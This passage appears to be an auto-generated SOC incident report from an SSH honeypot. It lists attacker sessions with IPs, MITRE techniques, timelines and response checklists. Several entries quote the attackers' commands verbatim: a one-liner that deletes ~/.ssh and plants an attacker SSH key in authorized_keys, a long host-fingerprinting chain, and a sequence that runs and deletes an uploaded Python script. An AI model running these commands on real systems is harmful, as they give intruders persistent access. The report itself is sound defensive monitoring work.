| `2026-07-06 11:42:56` | `cowrie.command.input` |
| `2026-07-06 11:42:56` | `cowrie.command.input` |
| `2026-07-06 11:42:56` | `cowrie.command.input` |
| `2026-07-06 11:42:56` | `cowrie.command.success` |
| `2026-07-06 11:42:56` | `cowrie.command.input` |
| `2026-07-06 11:42:56` | `cowrie.command.input` |
| `2026-07-06 11:42:56` | `cowrie.command.input` |
| `2026-07-06 11:42:56` | `cowrie.command.input` |
| `2026-07-06 11:42:57` | `cowrie.log.closed` |
| `2026-07-06 11:42:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd72f08f0c04

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 11:44 |
| **Last Seen** | 2026-07-06 11:44 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:44:32` | `cowrie.session.connect` |
| `2026-07-06 11:44:34` | `cowrie.client.version` |
| `2026-07-06 11:44:34` | `cowrie.client.kex` |
| `2026-07-06 11:44:41` | `cowrie.login.success` |
| `2026-07-06 11:44:45` | `cowrie.session.params` |
| `2026-07-06 11:44:45` | `cowrie.command.input` |
| `2026-07-06 11:44:47` | `cowrie.log.closed` |
| `2026-07-06 11:44:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95132c0c3ea5

| Field | Detail |
|---|---|
| **Source IP** | `220.88.220[.]59` |
| **First Seen** | 2026-07-06 11:44 |
| **Last Seen** | 2026-07-06 11:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:44:51` | `cowrie.session.connect` |
| `2026-07-06 11:44:51` | `cowrie.client.version` |
| `2026-07-06 11:44:51` | `cowrie.client.kex` |
| `2026-07-06 11:44:52` | `cowrie.login.success` |
| `2026-07-06 11:44:53` | `cowrie.session.params` |
| `2026-07-06 11:44:53` | `cowrie.command.input` |
| `2026-07-06 11:44:53` | `cowrie.command.failed` |
| `2026-07-06 11:44:54` | `cowrie.log.closed` |
| `2026-07-06 11:44:55` | `cowrie.session.params` |
| `2026-07-06 11:44:55` | `cowrie.command.input` |
| `2026-07-06 11:44:55` | `cowrie.session.file_download` |
| `2026-07-06 11:44:55` | `cowrie.log.closed` |
| `2026-07-06 11:44:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.88.220[.]59` to AbuseIPDB if not already reported
- [ ] Block `220.88.220[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bc90b4cc03c

| Field | Detail |
|---|---|
| **Source IP** | `220.88.220[.]59` |
| **First Seen** | 2026-07-06 11:44 |
| **Last Seen** | 2026-07-06 11:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:44:55` | `cowrie.session.connect` |
| `2026-07-06 11:44:55` | `cowrie.client.version` |
| `2026-07-06 11:44:55` | `cowrie.client.kex` |
| `2026-07-06 11:44:56` | `cowrie.login.success` |
| `2026-07-06 11:44:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.88.220[.]59` to AbuseIPDB if not already reported
- [ ] Block `220.88.220[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de48b6ed87da

| Field | Detail |
|---|---|
| **Source IP** | `220.88.220[.]59` |
| **First Seen** | 2026-07-06 11:44 |
| **Last Seen** | 2026-07-06 11:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:44:56` | `cowrie.session.connect` |
| `2026-07-06 11:44:56` | `cowrie.client.version` |
| `2026-07-06 11:44:57` | `cowrie.client.kex` |
| `2026-07-06 11:44:57` | `cowrie.login.success` |
| `2026-07-06 11:44:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.88.220[.]59` to AbuseIPDB if not already reported
- [ ] Block `220.88.220[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-668a3261c121

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 11:45 |
| **Last Seen** | 2026-07-06 11:45 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:45:09` | `cowrie.session.connect` |
| `2026-07-06 11:45:10` | `cowrie.client.version` |
| `2026-07-06 11:45:10` | `cowrie.client.kex` |
| `2026-07-06 11:45:16` | `cowrie.login.success` |
| `2026-07-06 11:45:19` | `cowrie.session.params` |
| `2026-07-06 11:45:19` | `cowrie.command.input` |
| `2026-07-06 11:45:19` | `cowrie.command.input` |
| `2026-07-06 11:45:19` | `cowrie.command.input` |
| `2026-07-06 11:45:19` | `cowrie.command.input` |
| `2026-07-06 11:45:19` | `cowrie.command.input` |
| `2026-07-06 11:45:19` | `cowrie.command.success` |
| `2026-07-06 11:45:19` | `cowrie.command.input` |
| `2026-07-06 11:45:19` | `cowrie.command.input` |
| `2026-07-06 11:45:19` | `cowrie.command.input` |
| `2026-07-06 11:45:19` | `cowrie.command.input` |
| `2026-07-06 11:45:21` | `cowrie.log.closed` |
| `2026-07-06 11:45:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9e2006852c6

| Field | Detail |
|---|---|
| **Source IP** | `209.99.190[.]113` |
| **First Seen** | 2026-07-06 11:45 |
| **Last Seen** | 2026-07-06 11:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:45:47` | `cowrie.session.connect` |
| `2026-07-06 11:45:47` | `cowrie.client.version` |
| `2026-07-06 11:45:47` | `cowrie.client.kex` |
| `2026-07-06 11:45:47` | `cowrie.login.success` |
| `2026-07-06 11:45:48` | `cowrie.session.params` |
| `2026-07-06 11:45:48` | `cowrie.command.input` |
| `2026-07-06 11:45:48` | `cowrie.command.failed` |
| `2026-07-06 11:45:49` | `cowrie.log.closed` |
| `2026-07-06 11:45:49` | `cowrie.session.params` |
| `2026-07-06 11:45:49` | `cowrie.command.input` |
| `2026-07-06 11:45:49` | `cowrie.session.file_download` |
| `2026-07-06 11:45:49` | `cowrie.log.closed` |
| `2026-07-06 11:45:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.190[.]113` to AbuseIPDB if not already reported
- [ ] Block `209.99.190[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8170dbc3ab9a

| Field | Detail |
|---|---|
| **Source IP** | `209.99.190[.]113` |
| **First Seen** | 2026-07-06 11:45 |
| **Last Seen** | 2026-07-06 11:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:45:50` | `cowrie.session.connect` |
| `2026-07-06 11:45:50` | `cowrie.client.version` |
| `2026-07-06 11:45:50` | `cowrie.client.kex` |
| `2026-07-06 11:45:50` | `cowrie.login.success` |
| `2026-07-06 11:45:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.190[.]113` to AbuseIPDB if not already reported
- [ ] Block `209.99.190[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54ebd308ed80

| Field | Detail |
|---|---|
| **Source IP** | `209.99.190[.]113` |
| **First Seen** | 2026-07-06 11:45 |
| **Last Seen** | 2026-07-06 11:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:45:50` | `cowrie.session.connect` |
| `2026-07-06 11:45:50` | `cowrie.client.version` |
| `2026-07-06 11:45:50` | `cowrie.client.kex` |
| `2026-07-06 11:45:51` | `cowrie.login.success` |
| `2026-07-06 11:45:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.190[.]113` to AbuseIPDB if not already reported
- [ ] Block `209.99.190[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef98ede66477

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-06 11:46 |
| **Last Seen** | 2026-07-06 11:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:46:02` | `cowrie.session.connect` |
| `2026-07-06 11:46:02` | `cowrie.client.version` |
| `2026-07-06 11:46:02` | `cowrie.client.kex` |
| `2026-07-06 11:46:02` | `cowrie.login.success` |
| `2026-07-06 11:46:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6c646596606

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-06 11:46 |
| **Last Seen** | 2026-07-06 11:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:46:03` | `cowrie.session.connect` |
| `2026-07-06 11:46:03` | `cowrie.client.version` |
| `2026-07-06 11:46:03` | `cowrie.client.kex` |
| `2026-07-06 11:46:03` | `cowrie.login.success` |
| `2026-07-06 11:46:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1753683b1a18

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 11:47 |
| **Last Seen** | 2026-07-06 11:47 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:47:33` | `cowrie.session.connect` |
| `2026-07-06 11:47:34` | `cowrie.client.version` |
| `2026-07-06 11:47:34` | `cowrie.client.kex` |
| `2026-07-06 11:47:41` | `cowrie.login.success` |
| `2026-07-06 11:47:44` | `cowrie.session.params` |
| `2026-07-06 11:47:44` | `cowrie.command.input` |
| `2026-07-06 11:47:44` | `cowrie.command.input` |
| `2026-07-06 11:47:44` | `cowrie.command.input` |
| `2026-07-06 11:47:44` | `cowrie.command.input` |
| `2026-07-06 11:47:44` | `cowrie.command.input` |
| `2026-07-06 11:47:44` | `cowrie.command.success` |
| `2026-07-06 11:47:44` | `cowrie.command.input` |
| `2026-07-06 11:47:44` | `cowrie.command.input` |
| `2026-07-06 11:47:44` | `cowrie.command.input` |
| `2026-07-06 11:47:44` | `cowrie.command.input` |
| `2026-07-06 11:47:45` | `cowrie.log.closed` |
| `2026-07-06 11:47:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af58867f1834

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-06 11:49 |
| **Last Seen** | 2026-07-06 11:51 |
| **Session Duration** | 126s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:49:30` | `cowrie.session.connect` |
| `2026-07-06 11:49:30` | `cowrie.client.version` |
| `2026-07-06 11:49:30` | `cowrie.client.kex` |
| `2026-07-06 11:49:31` | `cowrie.login.success` |
| `2026-07-06 11:49:32` | `cowrie.session.file_upload` |
| `2026-07-06 11:49:32` | `cowrie.session.params` |
| `2026-07-06 11:49:32` | `cowrie.command.input` |
| `2026-07-06 11:49:32` | `cowrie.command.input` |
| `2026-07-06 11:49:32` | `cowrie.command.input` |
| `2026-07-06 11:49:32` | `cowrie.command.failed` |
| `2026-07-06 11:49:32` | `cowrie.log.closed` |
| `2026-07-06 11:49:33` | `cowrie.session.params` |
| `2026-07-06 11:49:33` | `cowrie.command.input` |
| `2026-07-06 11:49:33` | `cowrie.log.closed` |
| `2026-07-06 11:49:34` | `cowrie.session.params` |
| `2026-07-06 11:49:34` | `cowrie.command.input` |
| `2026-07-06 11:49:34` | `cowrie.log.closed` |
| `2026-07-06 11:49:35` | `cowrie.session.params` |
| `2026-07-06 11:49:35` | `cowrie.command.input` |
| `2026-07-06 11:49:35` | `cowrie.command.failed` |
| `2026-07-06 11:49:35` | `cowrie.command.failed` |
| `2026-07-06 11:50:36` | `cowrie.session.params` |
| `2026-07-06 11:50:36` | `cowrie.command.input` |
| `2026-07-06 11:51:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-061001e7a0b0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 11:49 |
| **Last Seen** | 2026-07-06 11:50 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:49:56` | `cowrie.session.connect` |
| `2026-07-06 11:49:57` | `cowrie.client.version` |
| `2026-07-06 11:49:57` | `cowrie.client.kex` |
| `2026-07-06 11:50:04` | `cowrie.login.success` |
| `2026-07-06 11:50:07` | `cowrie.session.params` |
| `2026-07-06 11:50:07` | `cowrie.command.input` |
| `2026-07-06 11:50:07` | `cowrie.command.input` |
| `2026-07-06 11:50:07` | `cowrie.command.input` |
| `2026-07-06 11:50:07` | `cowrie.command.input` |
| `2026-07-06 11:50:07` | `cowrie.command.input` |
| `2026-07-06 11:50:07` | `cowrie.command.success` |
| `2026-07-06 11:50:07` | `cowrie.command.input` |
| `2026-07-06 11:50:07` | `cowrie.command.input` |
| `2026-07-06 11:50:07` | `cowrie.command.input` |
| `2026-07-06 11:50:07` | `cowrie.command.input` |
| `2026-07-06 11:50:08` | `cowrie.log.closed` |
| `2026-07-06 11:50:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ef2010ca74c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 11:51 |
| **Last Seen** | 2026-07-06 11:52 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:51:50` | `cowrie.session.connect` |
| `2026-07-06 11:51:51` | `cowrie.client.version` |
| `2026-07-06 11:51:51` | `cowrie.client.kex` |
| `2026-07-06 11:51:56` | `cowrie.login.success` |
| `2026-07-06 11:51:59` | `cowrie.session.params` |
| `2026-07-06 11:51:59` | `cowrie.command.input` |
| `2026-07-06 11:51:59` | `cowrie.command.input` |
| `2026-07-06 11:51:59` | `cowrie.command.input` |
| `2026-07-06 11:51:59` | `cowrie.command.input` |
| `2026-07-06 11:51:59` | `cowrie.command.input` |
| `2026-07-06 11:51:59` | `cowrie.command.success` |
| `2026-07-06 11:51:59` | `cowrie.command.input` |
| `2026-07-06 11:51:59` | `cowrie.command.input` |
| `2026-07-06 11:51:59` | `cowrie.command.input` |
| `2026-07-06 11:51:59` | `cowrie.command.input` |
| `2026-07-06 11:52:01` | `cowrie.log.closed` |
| `2026-07-06 11:52:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60f3d4407536

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 11:53 |
| **Last Seen** | 2026-07-06 11:53 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:53:47` | `cowrie.session.connect` |
| `2026-07-06 11:53:49` | `cowrie.client.version` |
| `2026-07-06 11:53:49` | `cowrie.client.kex` |
| `2026-07-06 11:53:54` | `cowrie.login.success` |
| `2026-07-06 11:53:57` | `cowrie.session.params` |
| `2026-07-06 11:53:57` | `cowrie.command.input` |
| `2026-07-06 11:53:57` | `cowrie.command.input` |
| `2026-07-06 11:53:57` | `cowrie.command.input` |
| `2026-07-06 11:53:57` | `cowrie.command.input` |
| `2026-07-06 11:53:57` | `cowrie.command.input` |
| `2026-07-06 11:53:57` | `cowrie.command.success` |
| `2026-07-06 11:53:57` | `cowrie.command.input` |
| `2026-07-06 11:53:57` | `cowrie.command.input` |
| `2026-07-06 11:53:57` | `cowrie.command.input` |
| `2026-07-06 11:53:57` | `cowrie.command.input` |
| `2026-07-06 11:53:58` | `cowrie.log.closed` |
| `2026-07-06 11:53:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4172487fd831

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 11:55 |
| **Last Seen** | 2026-07-06 11:55 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 11:55:44` | `cowrie.session.connect` |
| `2026-07-06 11:55:45` | `cowrie.client.version` |
| `2026-07-06 11:55:45` | `cowrie.client.kex` |
| `2026-07-06 11:55:53` | `cowrie.login.success` |
| `2026-07-06 11:55:56` | `cowrie.session.params` |
| `2026-07-06 11:55:56` | `cowrie.command.input` |
| `2026-07-06 11:55:56` | `cowrie.command.input` |
| `2026-07-06 11:55:56` | `cowrie.command.input` |
| `2026-07-06 11:55:56` | `cowrie.command.input` |
| `2026-07-06 11:55:56` | `cowrie.command.input` |
| `2026-07-06 11:55:56` | `cowrie.command.success` |
| `2026-07-06 11:55:56` | `cowrie.command.input` |
| `2026-07-06 11:55:56` | `cowrie.command.input` |
| `2026-07-06 11:55:56` | `cowrie.command.input` |
| `2026-07-06 11:55:56` | `cowrie.command.input` |
| `2026-07-06 11:55:58` | `cowrie.log.closed` |
| `2026-07-06 11:55:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e39a8d06f86

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 11:56 |
